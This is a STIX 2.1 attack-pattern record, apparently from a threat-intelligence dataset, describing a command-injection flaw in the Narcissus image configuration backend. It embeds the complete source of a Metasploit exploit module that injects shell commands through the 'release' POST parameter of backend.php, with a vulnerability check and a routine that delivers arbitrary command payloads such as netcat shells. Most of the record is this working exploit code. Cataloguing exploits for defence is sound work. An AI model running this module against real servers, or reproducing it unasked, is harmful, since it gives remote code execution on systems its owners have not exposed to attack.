{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5082205a-db4f-4f71-bd11-6b35a66dd937",
    "created": "2024-08-14T17:14:02.940361Z",
    "modified": "2024-08-14T17:14:02.940366Z",
    "name": "\"Narcissus Image Configuration Passthru Vulnerability\"",
    "description": " This module exploits a vulnerability found in Narcissus image configuration function.  This is due to the backend.php file not handling the $release parameter properly, and then passes it on to the configure_image() function.  In this function, the $release parameter can be used to inject system commands for passthru (a PHP function that's meant to be used to run a bash script by the vulnerable application), which allows remote code execution under the context of the web server.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/narcissus_backend_exec.rb",
            "external_id": "narcissus_backend_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Narcissus Image Configuration Passthru Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Narcissus image configuration\n        function.  This is due to the backend.php file not handling the $release parameter\n        properly, and then passes it on to the configure_image() function.  In this\n        function, the $release parameter can be used to inject system commands for\n        passthru (a PHP function that's meant to be used to run a bash script by the\n        vulnerable application), which allows remote code execution under the context\n        of the web server.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Dun',    #Original\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '22709' ],\n          [ 'OSVDB', '87410' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0d\\x0a\",\n          'Compat'         =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby python netcat netcat-e'\n            },\n        },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['Narcissus', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-11-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/narcissus-master/'])\n      ])\n  end\n\n  def base\n    uri = target_uri.path\n    uri << '/' if uri[-1,1] != '/'\n    return uri\n  end\n\n  def remote_exe(command)\n    res = send_request_cgi({\n      'uri'      => \"#{base}backend.php\",\n      'method'   => 'POST',\n      'encode_params' => false,\n      'vars_post' => {\n        'machine' => '0',\n        'action'  => 'configure_image',\n        'release' => \"|#{command}\"\n      }\n    })\n\n    vprint_line(res.body) if res\n    return res\n  end\n\n  def check\n    sig = rand_text_alpha(rand(10) + 5)  #The string to check\n\n    vprint_status(\"Looking for signature '#{sig}'...\")\n    res = remote_exe(\"echo #{sig}\")\n\n    if res and res.body =~ /#{sig}/\n      vprint_status(\"Signature '#{sig}' found.\")\n      return Exploit::CheckCode::Vulnerable\n    else\n      vprint_status(\"Signature not found\")\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status(\"Sending malicious request...\")\n    remote_exe(payload.encoded)\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2012-11-14",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}